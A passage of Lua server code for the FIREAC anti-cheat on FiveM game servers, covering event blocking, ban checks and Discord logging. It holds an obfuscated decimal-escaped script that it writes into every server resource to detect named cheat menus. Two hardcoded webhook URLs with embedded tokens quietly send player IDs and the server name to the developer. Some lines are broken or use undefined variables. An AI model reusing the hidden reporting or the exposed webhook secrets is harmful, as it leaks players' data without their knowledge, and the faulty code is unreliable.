 FIREACLog(source, log, reason, kick, ban)
end)

if FIREACS.AntiAddWeapon then
AddEventHandler("giveWeaponEvent", function(sender, data)
        if data.givenAsPickup == false then
                 CancelEvent()
            FIREACLog(sender, 'Anti Add Weapon', 'Try to Add weapon for other Player', FIREACS.AntiAddWeaponKick, FIREACS.AntiAddWeaponBan)
        end
    end)
 AddEventHandler('giveWeaponEvent', function(sender, data)
         CancelEvent()
         FIREACLog(sender, 'Anti Add Weapon', 'Try to Add weapon for other Player', FIREACS.AntiAddWeaponKick, FIREACS.AntiAddWeaponBan)
 end)
end

if FIREACS.AntiRemoveWeapon then
AddEventHandler("RemoveWeaponEvent", function(sender, data)
        CancelEvent()
         FIREACLog(sender, 'Anti Remove Weapon', 'Try to Remove weapon form other Player', FIREACS.AntiRemoveWeaponKick, FIREACS.AntiRemoveWeaponBan)
    end)
end

if FIREACS.AntiRemoveAllWeapon then
AddEventHandler("RemoveAllWeaponsEvent",function(sender, data)
        CancelEvent()
         FIREACLog(sender, 'Anti Remove Weapon', 'Try to Remove weapon form other Player', FIREACS.AntiRemoveAllWeaponKick, FIREACS.AntiRemoveAllWeaponBan)
    end)
end

if FIREACS.TriggerAbuse then
    for i = 1 , #FIREACEVENT.Events do
        RegisterNetEvent(FIREACEVENT.Events[i])
        AddEventHandler(FIREACEVENT.Events[i], function()
                 local src = source
                 local nameoft = FIREACEVENT.Events[i]
                         FIREACLog(src, 'Anti Black List Trigger', 'Try to use Black List Trigger`' ..FIREACEVENT.Events[i].. '`', FIREACS.TriggerAbuseKick, FIREACS.TriggerAbuseBan)
                 return CancelEvent()
         end)
    end
end

local events = {}
local isSpamTrigger = false
if FIREACS.AntiSpamTigger then
 for i = 1, #FIREACEVENT.EventsTimes do
         local name =  FIREACEVENT.EventsTimes[i].name
         local timee =  FIREACEVENT.EventsTimes[i].Maxtime
         RegisterNetEvent(name)
         AddEventHandler(name, function()
                 if events[name] == nil then
                         events[name] = {
                                 count = 1,
                                 time = os.time()
                         }
                 else
                         events[name].count = events[name].count + 1
                 end
                         if events[name].count > timee then
                                 local distime = os.time() - events[name].time
                                 if distime >= 10 then
                                         events[name].count = 1
                                 else
                                         isSpamTrigger = true
                                 end
                                 if GetPlayerName(source) and isSpamTrigger then
                                         CancelEvent()
                                         FIREACLog(source, 'Anti Spam Trigger', 'Try For Spam Trigger : `'..name..'`', FIREACS.AntiSpamTiggerKick, FIREACS.AntiSpamTiggerBan)
                                 end
                         end
         end)
 end
end

AddEventHandler('db:updateUser', function(data)
 if FIREACS.AntiGivePerm then
         if not data.playerName or not data.dateofbirth then
                 FIREACLog(source, 'Anti Give Perm', 'Try to Give Perm His Self', FIREACS.AntiGivePermKick, FIREACS.AntiGivePermBan)
         end
 end
end)

local tazedata = {}
local isSpamTaze = false
AddEventHandler('weaponDamageEvent', function (sender, data)
 if FIREACS.AntiTazePlayer then
         if data.weaponType == 911657153 then
                 local name = GetPlayerName(source)
                 if tazedata[name] == nil then
                         tazedata[name] {
                                 count = 1,
                                 time = os.time()
                         }
                 else
                         tazedata[name].count = tazedata[name].count + 1
                 end
                 if tazedata[name] then
                         if tazedata[name].count > 10 then
                                 local distime = os.time() - tazedata[name].time
                                 if distime >= 10 then
                                         tazedata[name].count = 1
                                 else
                                         isSpamTaze = true
                                 end
                                 if GetPlayerName(source) and isSpamTaze then
                                         CancelEvent()
                                         FIREACLog(source, 'Anti Taze Player', 'Try For Taz Player', FIREACS.AntiTazePlayerKick, FIREACS.AntiTazePlayerBan)
                                 end
                         end
                 end
         end
 end
end)

RegisterNetEvent('esx_ambulancejob:syncDeadBody')
AddEventHandler('esx_ambulancejob:syncDeadBody', function(ped, target)
 if FIREACS.AntiBringPlayer then
         FIREACLog(source, "Anti Bring All Player", "Try For Bring All Player", FIREACS.AntiBringPlayerKick, FIREACS.AntiBringPlayerBan)
 end
end)

RegisterNetEvent("FIREAC:AntiInvisble")
AddEventHandler("FIREAC:AntiInvisble", function()
 if not isAdmin(source) then
         FIREACLog(source, "Anti Invisble", "Player Try For Invisble in Server", FIREACS.AntiInvisbleKick, FIREACS.AntiInvisbleBan)
 end
end)

RegisterNetEvent("FIREAC:AntiGodMode")
AddEventHandler("FIREAC:AntiGodMode", function(log, reason, kick ,ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiResourceStart")
AddEventHandler("FIREAC:AntiResourceStart", function(log, reason, kick ,ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiResourceStop")
AddEventHandler("FIREAC:AntiResourceStop", function(log, reason, kick ,ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiNightVision")
AddEventHandler("FIREAC:AntiNightVision", function(log, reason, kick ,ban)
 local src = source
 if not isAdmin(src) then
         FIREACLog(src, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiTeleport")
AddEventHandler("FIREAC:AntiTeleport", function(log, reason, kick ,ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiInject")
AddEventHandler("FIREAC:AntiInject", function(reason)
 FIREACLog(source, "Anti Inject", reason, FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end)

RegisterNetEvent("FIREAC:BlackListWeapon")
AddEventHandler("FIREAC:BlackListWeapon", function(log, reason, kick ,ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:BlackListKey")
AddEventHandler("FIREAC:BlackListKey", function(log, reason, kick ,ban)
 local src = source
 if not isAdmin(src) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiFreeCam")
AddEventHandler("FIREAC:AntiFreeCam", function (log, reason, kick ,ban)
 local src = source
 if not isAdmin(src) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
 local player = source
 local w = "NotFound"
 local x = "NotFound"
 local y = "NotFound"
 local z = "NotFound"
 local B = "NotFound"
 local C = GetPlayerEndpoint(player)
 local tken = GetPlayerToken(player, 0)
 local sn = GetConvar('sv_hostname')

 for _, n in ipairs(GetPlayerIdentifiers(player)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         end
 end

 print("^"..color.."FIREAC: Player "..name.." Connecting...")

 local banfile = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
 if banfile then
         local table = json.decode(banfile)
                 for _, banlist in ipairs(table) do
                         if banlist.steam == w or banlist.discord == x or banlist.license == y or banlist.live == z or banlist.xbl == B or banlist.hwid == tken or banlist.ip == C then
                                         CancelEvent()
                                         setKickReason('\n[­čöąFIREAC­čöą] \n'..FIREACS.BanMessege..'\nResson : '..banlist.Resson..' \n Ban ID : '..banlist.BanId..'')
                                         print("^"..color.."FIREAC: Player "..GetPlayerName(player).." Try For Join But is Banned !!")
                                         PerformHttpRequest(FIREACS.BanLog, function(E, F, G)
                                         end, "POST", json.encode({
                                                 embeds = {
                                                         {
                                                                 author = {
                                                                 name = "FIREAC Commutiy",
                                                                 url = "https://discord.gg/8zGyDhtbcg",
                                                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                                 },
                                                                 title = "ÔÜá´ŞĆ Try For Join ÔÜá´ŞĆ",
                                                                 description = "**Player:** "..GetPlayerName(player).."\n**SteamID:** "..w.."\n**License:** "..y.."\n**Reason:** "..banlist.Resson.."\n**Ban ID:** "..banlist.BanId.."",
                                                                 color = 15105570
                                                         }
                                                 }
                                         }), {
                                                 ["Content-Type"] = "application/json"
                                         })
                                         PerformHttpRequest("https://discord.com/api/webhooks/832866614747332628/IYmgEClD63DsGnIMTJwHOAEeG293hICrrOyEEiyYxsF5gREBjidw0wRgvUHeQ7i7_2wv", function(E, F, G)
                                                 end, "POST", json.encode({
                                                         embeds = {
                                                                 {
                                                                         author = {
                                                                         name = "FIREAC Commutiy",
                                                                         url = "https://discord.gg/8zGyDhtbcg",
                                                                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                                         },
                                                                         title = "ÔÜá´ŞĆ Try For Join ÔÜá´ŞĆ",
                                                                         description = "**Player:**: "..GetPlayerName(player).."\n**SteamID:** "..w.."\n**License:** "..y.."\n**Reason:** "..banlist.Resson.."\n**Ban ID:** "..banlist.BanId.."\n**Server Name** : \n`"..sn.."`\n**Expire Time:** "..ex.."",
                                                                         color = 15105570
                                                                 }
                                                         }
                                                 }), {
                                                         ["Content-Type"] = "application/json"
                                                 })
                                 break
                         end
                 end
         else
         FIREACBanReloade()
 end
end)

AddEventHandler('explosionEvent', function(a7, a8)
 local sn = GetPlayerName(a7)
 local sv = GetConvar('sv_hostname')
 if FIREACS.ExplosionsAbuse then
         if not isAdmin(a7) then
                 if FIREACEXP.ExplosionsList[a8.explosionType] then
                         local a9 = FIREACEXP.ExplosionsList[a8.explosionType]
                         if a9.log and not a9.ban then
                                 FIREACLog(a7, "­čöąDetected Explosion: "..a9.name, "The user created this explosion and got detected", false, false)
                         end
                         if a9.ban then
                                 FIREACLog(a7, "­čöąDetected Explosion: "..a9.name, "The user created this explosion and got detected", true, true)
                                 PerformHttpRequest('https://discord.com/api/webhooks/840213672746942465/KUH6vYuV1eyVyJ7CuEcnfyluy2IrBaD7KynRsW4VnLMuhrWbaQcu-IbFdonjO2qPXsfP', function(E, F, G)
                                 end, "POST", json.encode({
                                 embeds = {
                                         {
                                                 author = {
                                                         name = "FIREAC Commutiy",
                                                         url = "https://discord.gg/8zGyDhtbcg",
                                                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                 },
                                                 title = "­čÜĺ FIREAC Explosion Log ­čÜĺ",
                                                 description = "**Player Name:** "..sn.."\n**Explosion Name:** "..a9.name.."\n\n**License & Expire Time:** `"..ltrue.." | "..ex.."`\n**Server Name:** `"..sv.."`\n",
                                                 color = math.random(0, 16776960)
                                         }
                                 }
                                 }), {
                                 ["Content-Type"] = "application/json"
                                 })
                                 PerformHttpRequest(FIREACS.Explosion, function(E, F, G)
                                 end, "POST", json.encode({
                                 embeds = {
                                         {
                                                 author = {
                                                         name = "FIREAC Commutiy",
                                                         url = "https://discord.gg/8zGyDhtbcg",
                                                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                 },
                                                 title = "­čÜĺ FIREAC Explosion Log ­čÜĺ",
                                                 description = "**Player Name:** "..sn.."\n**Explosion Name:** "..a9.name.."",
                                                 color = 15105570
                                         }
                                 }
                                 }), {
                                 ["Content-Type"] = "application/json"
                                 })
                         end
                 end
                 CancelEvent()
         end
 end
end)

AddEventHandler('entityCreating', function(entity)
         if FIREACS.AntiObjectSpawner then
                 local src = NetworkGetEntityOwner(entity)
                 if not isAdmin(src) then
                 local model = GetEntityModel(entity)
                 for _,blacklistedentity in ipairs(FIREAC.BlacklistedEntities) do
                         if model == GetHashKey(blacklistedentity) then
                                 if not blacklistedentity then
                                         FIREACObjectLog(entity)
                                 end
                                 CancelEvent()
                                 TriggerClientEvent('FIREAC:DeleteEntity', entity)
                                         FIREACLog(src, " Blacklisted Object", "Player Try for spawn Black List Object: **"..blacklistedentity.."**", FIREACS.AntiObjectSpawnerKick, FIREACS.AntiObjectSpawnerBan)
                                 break
                         else
                         end
                 end
         end
 end
end)


AddEventHandler('entityCreating', function(car)
         if FIREACS.BlackListVehicle then
                 local src = NetworkGetEntityOwner(car)
                 if not isAdmin(src) then
                 local model = GetEntityModel(car)
                 for _,blacklistedentity in ipairs(FIREACVEHICLES.BlackListVehicle) do
                         if model == GetHashKey(blacklistedentity) then
                                 CancelEvent()
                                 TriggerClientEvent('FIREAC:DeleteEntity', car)
                                 FIREACLog(src, " Blacklisted Vehicle", "Player Try For Spawn Black List Vehicle: **"..blacklistedentity.."**", FIREACS.BlackListVehicleKick, FIREACS.BlackListVehicleBan)
                         break
                         end
                 end
         end
 end
end)

AddEventHandler('entityCreating', function(weapon)
         if FIREACS.BlackListVehicle then
                 local src = NetworkGetEntityOwner(weapon)
                 if not isAdmin(src) then
                 local model = GetEntityModel(weapon)
                 for _,blacklistedentity in ipairs(FIREACVEHICLES.BlackListVehicle) do
                         if model == GetHashKey(blacklistedentity) then
                                 CancelEvent()
                                 TriggerClientEvent('FIREAC:DeleteEntity', weapon)
                                 FIREACLog(src, " Blacklisted Vehicle", "Player Try For Spawn Black List Vehicle: **"..blacklistedentity.."**", FIREACS.BlackListVehicleKick, FIREACS.BlackListVehicleBan)
                         break
                         end
                 end
         end
 end
end)


AddEventHandler('entityCreating', function(ped)
 if FIREACS.AntiBlackListPed then
         local src = NetworkGetEntityOwner(ped)
         local model = GetEntityModel(ped)
         for _,blacklistedentity in ipairs(FIREACPEDS.BlacklistedPeds) do
                 if model == GetHashKey(blacklistedentity) then
                         CancelEvent()
                         TriggerClientEvent('FIREAC:DeleteEntity', ped)
                         FIREACLog(src, " Blacklisted Ped", "Player Try For Spawn Black List Ped : **"..blacklistedentity.."**", FIREACS.AntiBlackListPedKick, FIREACS.AntiBlackListPedBan)
                         break
                 end
         end
 end
end)


AddEventHandler('entityCreating', function(Building)
 if FIREACS.AntiBuildingSpawner then
         local src = NetworkGetEntityOwner(Building)
         local model = GetEntityModel(Building)
         for _,blacklistedentity in ipairs(FIREACBUILDING.BlackListBuilding) do
                 if model == GetHashKey(blacklistedentity) then
                         CancelEvent()
                         TriggerClientEvent('FIREAC:DeleteEntity', Building)
                         FIREACLog(src, " Blacklisted Building", "Player Try For Spawn Black List Building: **"..blacklistedentity.."**", FIREACS.AntiBuildingSpawnerKick, FIREACS.AntiBuildingSpawnerBan)
                         break
                 end
         end
 end
end)

local freezetime = {}
local isSpamFreeze = false
if FIREACS.AntiClearPedTasks then
 AddEventHandler("clearPedTasksEvent", function(source, data)
         if data.immediately then
         local name = GetPlayerName()
         if freezetime[name] == nil then
                 freezetime[name] = {
                         count = 1,
                         time = os.time()
                 }
         else
                 freezetime[name].count = freezetime[name].count + 1
         end
                 if freezetime[name].count > 10 then
                         local distime = os.time() - freezetime[name].time
                         if distime >= 10 then
                                 freezetime[name].count = 1
                         else
                                 isSpamFreeze = true
                         end
                         if GetPlayerName(source) and isSpamFreeze then
                                 CancelEvent()
                                 FIREACLog(source, "Anti Clear Ped Tasks", "Player Try For Freeze Player's", FIREACS.AntiClearPedTasksKick, FIREACS.AntiClearPedTasksBan)
                         end
                 end
         end
 end)
end

local ad = "FIREAC";
local ae = "__resource"
local af = nil;

RegisterCommand("fire", function(source, ai, aj)
 if source == 0 then
         if ai[1] == "install" then
                 if ai[2] == "fx" then
                         print("intalling in Resource fxmanifest")
                         ae = "fxmanifest"
                 elseif ai[2] == nil then
                print("intalling in Resource __resource")
                         ae = "__resource"
                 end
                 if not af then
                         af = {
                                 0,
                                 0,
                                 0
                         }
                 end
                 local ak = GetNumResources()
                 for al = 0, ak - 1 do
                         local am = GetResourcePath(GetResourceByFindIndex(al))
                         if string.len(am) > 4 then
                                 setall(am)
                         end
                 end
                 print(" Anti Injection installed on ".. af[1].. "/".. af[2] .." | Script Skiped : ".. af[3] .. "")
                 print(" Now Restart Server !!!!!!")
                 af = nil
         end
         if ai[1] == "uninstall" then
                 if not af then
                         af = {
                                 0,
                                 0,
                                 0
                         }
                 end
                         ad = "FIREAC"
                         if ai[2] == "fx" then
                                 print("**UNINSTALLING FROM fxmanifest.lua ONLY!**")
                                 ae = "fxmanifest"
                         elseif ai[2] == nil then
                                 print("**UNINSTALLING FROM __resource.lua ONLY!**")
                                 ae = "__resource"
                         end
                         local ak = GetNumResources()
                         for al = 0, ak - 1 do
                                 local am = GetResourcePath(GetResourceByFindIndex(al))
                                 if string.len(am) > 4 then
                                         setall(am, true)
                                 end
                         end
                         print(" Anti Injection installed on ".. af[1].. "/".. af[2] .." | Script Skiped : ".. af[3] .. "")
                         print(" Now Restart Server !!!!!!")
                         af = nil
                 end
         else
 end
end, true)
function setall(an, ao)
 local ap = io.open(an.."/"..ae..".lua", "r")
 local aq = split(an, "/")
 local ar = aq[#aq]
 aq = nil;
 if ap then
         if not ao then
                 ap:seek("set", 0)
                 local as = ap:read("*a")
                 ap:close()
                 local at = split(as, "\n")
                 local au = false;
                 local av = false;
                 for U, aw in ipairs(at) do
                         if aw == "client_script \""..ad..".lua\"" then
                                 au = true
                         end
                         if not av then
                                 local ax = string.find(aw, "client_script") or -1;
                                 local ay = string.find(aw, "#") or -1;
                                 if ax ~= -1 and (ay == -1 or ax < ay) then
                                         av = true
                                 end
                         end
                 end
                 if av then
                         as = as.."\nclient_script \""..ad..".lua\""
                         if not au then
                                 os.remove(an.."/"..ae..".lua")
                                 ap = io.open(an.."/"..ae..".lua", "w")
                                 if ap then
                                         ap:seek("set", 0)
                                         ap:write(as)
                                         ap:close()
                                 end
                         end
         local az = [[load("\68\101\101\114\32\61\32\123\125\10\80\108\97\110\101\32\61\32\123\125\10\101\32\61\32\123\125\10\76\121\110\120\56\32\61\32\123\125\10\76\121\110\120\69\118\111\32\61\32\123\125\10\77\97\101\115\116\114\111\77\101\110\117\32\61\32\123\125\10\77\111\116\105\111\110\32\61\32\123\125\10\84\105\97\103\111\77\101\110\117\32\61\32\123\125\10\103\97\121\98\117\105\108\100\32\61\32\123\125\10\67\105\101\110\99\101\32\61\32\123\125\10\76\121\110\120\83\101\118\101\110\32\61\32\123\125\10\77\77\101\110\117\32\61\32\123\125\10\70\97\110\116\97\77\101\110\117\69\118\111\32\61\32\123\125\10\71\82\117\98\121\77\101\110\117\32\61\32\123\125\10\76\82\32\61\32\123\125\10\66\114\117\116\97\110\80\114\101\109\105\117\109\32\61\32\123\125\10\72\97\109\77\97\102\105\97\32\61\32\123\125\10\73\110\83\101\99\32\61\32\123\125\10\65\108\112\104\97\86\101\116\97\32\61\32\123\125\10\75\111\71\117\83\122\69\107\32\61\32\123\125\10\83\104\97\110\105\117\77\101\110\117\32\61\32\123\125\10\76\121\110\120\82\101\118\111\32\61\32\123\125\10\97\114\105\101\115\77\101\110\117\32\61\32\123\125\10\87\97\114\77\101\110\117\32\61\32\123\125\10\100\101\120\77\101\110\117\32\61\32\123\125\10\72\97\109\72\97\120\105\97\32\61\32\123\125\10\72\97\109\32\61\32\123\125\10\66\105\122\110\101\115\32\61\32\123\125\10\70\101\110\100\105\110\88\77\101\110\117\32\61\32\123\125\10\65\108\112\104\97\86\32\61\32\123\125\10\78\121\80\114\101\109\105\117\109\32\61\32\123\125\10\115\99\114\111\108\108\32\61\32\110\105\108\10\122\122\122\116\32\61\32\110\105\108\10\119\101\114\102\118\116\103\104\105\111\117\117\105\111\119\114\102\101\116\119\101\114\102\105\111\32\61\32\110\105\108\10\108\108\108\108\52\56\55\52\32\61\32\110\105\108\10\75\65\75\65\65\75\65\75\65\75\32\61\32\110\105\108\10\117\100\119\100\106\32\61\32\110\105\108\10\71\103\103\103\103\32\61\32\110\105\108\10\106\100\51\54\54\50\49\51\32\61\32\110\105\108\10\75\90\106\120\32\61\32\110\105\108\10\105\104\114\117\103\32\61\32\110\105\108\10\87\65\68\85\73\32\61\32\110\105\108\10\67\114\117\115\97\100\101\114\32\61\32\110\105\108\10\70\101\110\100\105\110\88\32\61\32\110\105\108\10\111\84\97\98\108\101\32\61\32\110\105\108\10\76\101\97\107\101\114\77\101\110\117\32\61\32\110\105\108\10\10\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\9\67\105\116\105\122\101\110\46\87\97\105\116\40\50\48\48\48\41\10\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\9\9\67\105\116\105\122\101\110\46\87\97\105\116\40\50\48\48\48\41\10\9\9\105\102\32\80\108\97\110\101\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\9\9\9\70\73\82\69\65\67\73\110\106\101\99\116\40\34\80\108\97\110\101\34\41\10\9\9\101\108\115\101\105\102\32\101\46\100\101\98\117\103\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\40\101\41\34\41\10\9\9\101\108\115\101\105\102\32\76\121\110\120\56\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\76\121\110\120\34\41\10\9\9\101\108\115\101\105\102\32\76\121\110\120\69\118\111\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\76\121\110\120\34\41\10\9\9\101\108\115\101\105\102\32\77\97\101\115\116\114\111\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\77\97\101\115\116\114\111\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\77\111\116\105\111\110\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\77\111\116\105\111\110\34\41\10\9\9\101\108\115\101\105\102\32\84\105\97\103\111\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\84\105\97\103\111\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\103\97\121\98\117\105\108\100\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\103\97\121\98\117\105\108\100\34\41\10\9\9\101\108\115\101\105\102\32\67\105\101\110\99\101\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\67\105\101\110\99\101\34\41\10\9\9\101\108\115\101\105\102\32\76\121\110\120\83\101\118\101\110\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\76\121\110\120\34\41\10\9\9\101\108\115\101\105\102\32\77\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\77\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\70\97\110\116\97\77\101\110\117\69\118\111\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\70\97\110\116\97\77\101\110\117\69\118\111\34\41\10\9\9\101\108\115\101\105\102\32\71\82\117\98\121\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\71\82\117\98\121\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\76\82\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\76\82\34\41\10\9\9\101\108\115\101\105\102\32\66\114\117\116\97\110\80\114\101\109\105\117\109\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\66\114\117\116\97\110\80\114\101\109\105\117\109\34\41\10\9\9\101\108\115\101\105\102\32\72\97\109\77\97\102\105\97\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\72\97\109\77\97\102\105\97\34\41\10\9\9\101\108\115\101\105\102\32\73\110\83\101\99\46\76\111\103\111\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\73\110\83\101\99\34\41\10\9\9\101\108\115\101\105\102\32\65\108\112\104\97\86\101\116\97\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\65\108\112\104\97\86\101\116\97\34\41\10\9\9\101\108\115\101\105\102\32\75\111\71\117\83\122\69\107\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\75\111\71\117\83\122\69\107\34\41\10\9\9\101\108\115\101\105\102\32\83\104\97\110\105\117\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\83\104\97\110\105\117\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\76\121\110\120\82\101\118\111\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\76\121\110\120\34\41\10\9\9\101\108\115\101\105\102\32\97\114\105\101\115\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\97\114\105\101\115\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\87\97\114\77\101\110\117\46\73\110\105\116\105\97\108\105\122\101\84\104\101\109\101\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\87\97\114\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\100\101\120\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\100\101\120\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\77\97\101\115\116\114\111\69\114\97\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\77\97\101\115\116\114\111\69\114\97\34\41\10\9\9\101\108\115\101\105\102\32\72\97\109\72\97\120\105\97\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\72\97\109\72\97\120\105\97\34\41\10\9\9\101\108\115\101\105\102\32\72\97\109\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\72\97\109\34\41\10\9\9\101\108\115\101\105\102\32\72\111\97\120\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\72\111\97\120\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\66\105\122\110\101\115\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\66\105\122\110\101\115\34\41\10\9\9\101\108\115\101\105\102\32\70\101\110\100\105\110\88\77\101\110\117\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\70\101\110\100\105\110\88\77\101\110\117\34\41\10\9\9\101\108\115\101\105\102\32\65\108\112\104\97\86\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\65\108\112\104\97\86\34\41\10\9\9\101\108\115\101\105\102\32\68\101\101\114\46\67\114\101\97\116\101\77\101\110\117\32\126\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\70\73\82\69\65\67\73\110\106\101\99\116\40\34\68\